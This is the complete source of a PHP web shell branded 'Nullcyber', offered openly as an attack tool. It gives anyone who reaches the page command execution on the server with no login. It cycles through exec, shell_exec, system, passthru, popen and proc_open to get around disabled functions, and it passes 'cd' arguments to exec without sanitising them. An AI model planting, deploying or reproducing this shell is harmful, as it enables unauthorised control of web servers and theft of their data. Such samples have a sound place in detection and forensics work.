<?php
session_start();

$SHELL_CONFIG = [
    'username' => 'Nullcyber',
    'hostname' => 'shell',
];

function expandPath($path) {
    if (preg_match('#^(~[a-zA-Z0-9_.-]*)(/.*)?$#', $path, $m)) {
        exec("echo {$m[1]}", $out);
        return $out[0] . ($m[2] ?? '');
    }
    return $path;
}

function getAvailableExecutor() {
    $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
    $candidates = ['exec', 'shell_exec', 'system', 'passthru', 'popen', 'proc_open'];
    foreach ($candidates as $func) {
        if (!in_array($func, $disabled) && function_exists($func)) {
            return $func;
        }
    }
    return 'file_get_contents';
}

function executeCommand($cmd) {
    $executor = getAvailableExecutor();
    $output = '';

    switch ($executor) {
        case 'exec':
            exec($cmd, $out);
            $output = implode("\n", $out);
            break;
        case 'shell_exec':
            $output = shell_exec($cmd);
            break;
        case 'system':
            ob_start();
            system($cmd);
            $output = ob_get_contents();
            ob_end_clean();
            break;
        case 'passthru':
            ob_start();
            passthru($cmd);
            $output = ob_get_contents();
            ob_end_clean();
            break;
        case 'popen':
            $handle = popen($cmd, 'r');
            while (!feof($handle)) {
                $output .= fread($handle, 4096);
            }
            pclose($handle);
            break;
        case 'proc_open':
            $handle = proc_open($cmd, [0 => ['pipe', 'r'], 1 => ['pipe', 'w']], $pipes);
            $output = stream_get_contents($pipes[1]);
            proc_close($handle);
            break;
        case 'file_get_contents':
            $encoded = base64_encode($cmd);
            $url = "http://localhost:80/exec?cmd=" . urlencode($encoded);
            $output = @file_get_contents($url);
            if ($output === false) {
                $output = "Semua fungsi mati, fallback gagal. Dasar lemah!";
            }
            break;
        default:
            $output = "Gak ada fungsi yang bisa dipake.";
    }
    return $output;
}

if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd();
}

$output = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    chdir($_SESSION['cwd']);

    if (preg_match('/^\s*cd\s+(.+)\s*$/', $cmd, $m)) {
        $newDir = expandPath($m[1]);
        if (is_dir($newDir)) {
            chdir($newDir);
            $_SESSION['cwd'] = getcwd();
            $output = "Pindah ke " . $_SESSION['cwd'];
        } else {
            $output = "cd: $newDir: Gak ada direktori tolol!";
        }
    } else {
        $output = executeCommand($cmd);
        $_SESSION['cwd'] = getcwd();
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Nullcyber@shell:~#</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #333;
            color: #eee;
            font-family: monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        #shell {
            background: #222;
            box-shadow: 0 0 15px rgba(0,0,0,0.5);
            width: 90%;
            max-width: 800px;
            height: 80vh;
            display: flex;
            flex-direction: column;
            border-radius: 5px;
            overflow: hidden;
        }
        #shell-content {
            flex: 1;
            overflow-y: auto;
            padding: 10px;
            white-space: pre-wrap;
            background: #1a1a1a;
        }
        #shell-input {
            display: flex;
            padding: 8px;
            background: #2a2a2a;
            border-top: 1px solid #444;
        }
        #shell-prompt {
            color: #75DF0B;
            font-weight: bold;
            margin-right: 5px;
            line-height: 30px;
        }
        #shell-cmd {
            flex: 1;
            background: transparent;
            border: none;
            color: #eee;
            font-family: monospace;
            font-size: 14px;
            outline: none;
            line-height: 30px;
        }
        .info {
            color: #888;
            font-size: 12px;
            padding: 5px 10px;
            background: #2a2a2a;
            border-bottom: 1px solid #444;
        }
    </style>
</head>
<body>
<div id="shell">
    <div class="info">Executor: <?php echo getAvailableExecutor(); ?> | CWD: <?php echo $_SESSION['cwd']; ?></div>
    <div id="shell-content"><?php echo htmlspecialchars($output); ?></div>
    <form method="post" id="shell-input">
        <label id="shell-prompt"><?php echo $_SESSION['cwd']; ?>$</label>
        <input type="text" id="shell-cmd" name="cmd" autofocus>
    </form>
</div>
<script>
    // Auto focus dan scroll ke bawah
    document.getElementById('shell-cmd').focus();
    var content = document.getElementById('shell-content');
    content.scrollTop = content.scrollHeight;
</script>
</body>
</html>
